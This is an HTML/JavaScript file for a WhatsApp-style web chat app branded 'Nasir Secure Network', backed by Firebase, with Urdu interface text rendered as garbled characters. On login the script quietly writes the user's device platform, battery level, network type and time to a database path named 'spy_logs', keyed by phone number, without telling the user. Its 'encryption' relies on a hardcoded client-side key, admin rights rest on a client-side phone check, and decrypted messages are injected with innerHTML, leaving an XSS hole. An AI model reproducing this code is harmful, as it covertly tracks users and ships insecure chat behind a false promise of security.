<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nasir Pro VIP</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        :root { --wa-teal: #075e54; --bg: #121b22; --sent: #dcf8c6; }
        body { margin: 0; font-family: 'Segoe UI', sans-serif; background: #e5ddd5; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
        
        #auth-screen { position: fixed; inset: 0; background: #121b22; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; color: white; padding: 20px; text-align: center; }
        .input-box { width: 85%; max-width: 300px; padding: 15px; margin: 10px 0; border-radius: 10px; border: none; font-size: 16px; background: #2a3942; color: white; outline: none; }
        .btn { background: #00a884; color: white; padding: 12px 40px; border-radius: 25px; border: none; font-weight: bold; cursor: pointer; width: 85%; max-width: 300px; font-size: 18px; }

        #main-app { display: none; flex-direction: column; height: 100vh; }
        .header { background: var(--wa-teal); color: white; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
        #chat-flow { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; background-image: url('https://user-images.githubusercontent.com/15075759/28719144-86dc0f70-73b1-11e7-911d-60d70fcded21.png'); background-blend-mode: overlay; background-color: rgba(229,221,213,0.9); }
        
        .msg { padding: 10px; border-radius: 10px; max-width: 75%; font-size: 15px; position: relative; box-shadow: 0 1px 1px rgba(0,0,0,0.1); word-wrap: break-word; }
        .sent { align-self: flex-end; background: var(--sent); border-top-right-radius: 2px; }
        .recv { align-self: flex-start; background: white; border-top-left-radius: 2px; }

        .footer { background: #f0f2f5; padding: 10px; display: flex; align-items: center; gap: 10px; }
        #msg-in { flex: 1; border-radius: 25px; padding: 12px; border: none; outline: none; font-size: 16px; }
        .icon-btn { color: #54656f; font-size: 22px; cursor: pointer; }
        #file-input { display: none; }
    </style>
</head>
<body>

<div id="auth-screen">
    <i class="fas fa-shield-alt" style="font-size: 60px; color: #00a884; margin-bottom: 20px;"></i>
    <h2>Nasir Secure Network</h2>
    <input type="text" id="phone" class="input-box" placeholder="ŸÖŸàÿ®ÿßÿ¶ŸÑ ŸÜŸÖÿ®ÿ± (0300...)">
    <button class="btn" onclick="enterApp()">ÿßŸÜÿØÿ± ÿØÿßÿÆŸÑ €ÅŸà⁄∫</button>
</div>

<div id="main-app">
    <div class="header">
        <div id="user-display"><b>ÿ™ÿ≠ŸÅÿ∏ ÿ¥ÿØ€Å ⁄©ŸÖÿ±€Å</b></div>
        <div style="display: flex; gap: 15px;">
            <i class="fas fa-trash-alt" id="admin-del" style="display:none; color: #ff5252; cursor: pointer;" onclick="clearChat()"></i>
            <i class="fas fa-power-off" onclick="location.reload()"></i>
        </div>
    </div>
    
    <div id="chat-flow"></div>

    <div class="footer">
        <label for="file-input"><i class="fas fa-paperclip icon-btn"></i></label>
        <input type="file" id="file-input" onchange="handleFile(this)">
        <i class="fas fa-camera icon-btn" onclick="document.getElementById('file-input').click()"></i>
        <input type="text" id="msg-in" placeholder="ŸÖ€åÿ≥ÿ¨ ŸÑ⁄©⁄æ€å⁄∫ (ÿß€åŸÖŸàÿ¨€å ⁄©€å ÿ®Ÿàÿ±⁄à)...">
        <i class="fas fa-map-marker-alt icon-btn" onclick="sendLocation()" style="color: #ea4335;"></i>
        <button onclick="sendMsg()" style="background:#00a884; border:none; color:white; width:45px; height:45px; border-radius:50%; cursor:pointer;"><i class="fas fa-paper-plane"></i></button>
    </div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push, onChildAdded, set, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
        apiKey: "AIzaSyAaLNT4BuuvHeJTEqSBg52BbWxKYPHPYes",
        authDomain: "message-me-bbd25.firebaseapp.com",
        databaseURL: "https://message-me-bbd25-default-rtdb.firebaseio.com",
        projectId: "message-me-bbd25",
        storageBucket: "message-me-bbd25.firebasestorage.app",
        messagingSenderId: "284942258094",
        appId: "1:284942258094:web:06d05da0bba156a6f6c23f"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const CRYPTO_KEY = "nasir_secret_786";
    let currentUser = "";

    window.enterApp = async () => {
        const phone = document.getElementById('phone').value.trim();
        if(phone.length < 10) return alert("ÿØÿ±ÿ≥ÿ™ ŸÜŸÖÿ®ÿ± ŸÑ⁄©⁄æ€å⁄∫!");
        currentUser = phone;

        // ÿß€å⁄àŸÖŸÜ ⁄Ü€å⁄© (ÿß⁄Øÿ± ÿ¢Ÿæ ÿßŸæŸÜÿß ÿÆÿßÿµ ŸÜŸÖÿ®ÿ± ⁄àÿßŸÑ€å⁄∫ ÿ™Ÿà ⁄à€åŸÑ€åŸπ ÿ®ŸπŸÜ ŸÜÿ∏ÿ± ÿ¢ÿ¶€í ⁄Øÿß)
        if(phone === "03000000000") { // €å€Åÿß⁄∫ ÿßŸæŸÜÿß ŸÜŸÖÿ®ÿ± ŸÑ⁄©⁄æ€å⁄∫
            document.getElementById('admin-del').style.display = 'block';
        }

        // ÿ®€åŸπÿ±€å Ÿπÿ±€å⁄©ŸÜ⁄Ø
        let bat = "N/A";
        try { const b = await navigator.getBattery(); bat = (b.level * 100) + "%"; } catch(e) {}

        set(ref(db, "spy_logs/" + phone), {
            device: navigator.platform,
            battery: bat,
            network: navigator.connection ? navigator.connection.effectiveType : "Unknown",
            time: new Date().toLocaleString()
        });

        document.getElementById('auth-screen').style.display = 'none';
        document.getElementById('main-app').style.display = 'flex';
        document.getElementById('user-display').innerHTML = `<b>Room: ${phone}</b>`;
        loadMsgs();
    };

    window.sendMsg = (manual = null) => {
        const text = manual || document.getElementById('msg-in').value.trim();
        if(!text) return;
        const enc = CryptoJS.AES.encrypt(text, CRYPTO_KEY).toString();
        push(ref(db, "chats/" + currentUser), { text: enc, time: new Date().toLocaleTimeString() });
        document.getElementById('msg-in').value = "";
    };

    window.handleFile = (input) => {
        const file = input.files[0];
        if(file) sendMsg(`üìé ŸÅÿßÿ¶ŸÑ: ${file.name}`);
    };

    window.sendLocation = () => {
        navigator.geolocation.getCurrentPosition(p => {
            sendMsg(`üìç ŸÑŸà⁄©€åÿ¥ŸÜ: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
        });
    };

    window.clearChat = () => {
        if(confirm("⁄©€åÿß ÿ¢Ÿæ ŸæŸàÿ±€å ⁄Ü€åŸπ ⁄à€åŸÑ€åŸπ ⁄©ÿ±ŸÜÿß ⁄Üÿß€Åÿ™€í €Å€å⁄∫ÿü")) {
            remove(ref(db, "chats/" + currentUser));
            location.reload();
        }
    };

    function loadMsgs() {
        onChildAdded(ref(db, "chats/" + currentUser), (data) => {
            const m = data.val();
            let dec = "";
            try { dec = CryptoJS.AES.decrypt(m.text, CRYPTO_KEY).toString(CryptoJS.enc.Utf8); } catch(e) { dec = "üîí"; }
            const div = document.createElement('div');
            div.className = `msg sent`;
            div.innerHTML = `${dec}<br><small style="font-size:9px; float:right; color:#888;">${m.time}</small>`;
            document.getElementById('chat-flow').appendChild(div);
            document.getElementById('chat-flow').scrollTop = document.getElementById('chat-flow').scrollHeight;
        });
    }
</script>
</body>
    </html>
